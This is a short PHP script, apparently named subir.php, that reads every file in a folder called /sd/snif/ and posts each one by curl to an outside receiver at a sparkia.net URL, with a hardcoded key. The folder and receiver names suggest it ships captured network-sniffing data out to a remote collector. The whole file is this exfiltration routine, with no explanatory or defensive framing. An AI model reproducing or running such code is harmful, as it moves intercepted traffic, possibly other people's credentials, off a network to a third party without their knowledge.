<?php                                                                                                                                                 
$target_url = 'http://cinepolisv1.sparkia.net/receptor/';
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
$path    = '/sd/snif/';                                                                                                                               
$files = scandir($path);
                                                                                                                                                      
//print_r($files);                                                                                                                                    
                                                                                                                                                      
foreach ($files as $value) {
if($value!="subir.php" and $value!="." and $value!=".."){
$file_name_with_full_path = realpath("/sd/snif/$value");                   
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
$post=array('clave'=>'mofos2014','gateway' => 'dulceria','file_contents'=>'@'.$file_name_with_full_path);                                            
                                                                                                                                                      
$ch = curl_init();                                                                                                                                    
curl_setopt($ch, CURLOPT_URL,$target_url);                                                                                                            
curl_setopt($ch, CURLOPT_POST,1);                                                                                                                     
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);                                                                                                          
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);                                                                                                           
$result=curl_exec ($ch);                                                                                                                              
curl_close ($ch);                                                                                                                                 
}                                                                                                                                 
                                                                                                                                                      
echo $result;                                                                                                                                 
}                                                                                                                                 
?>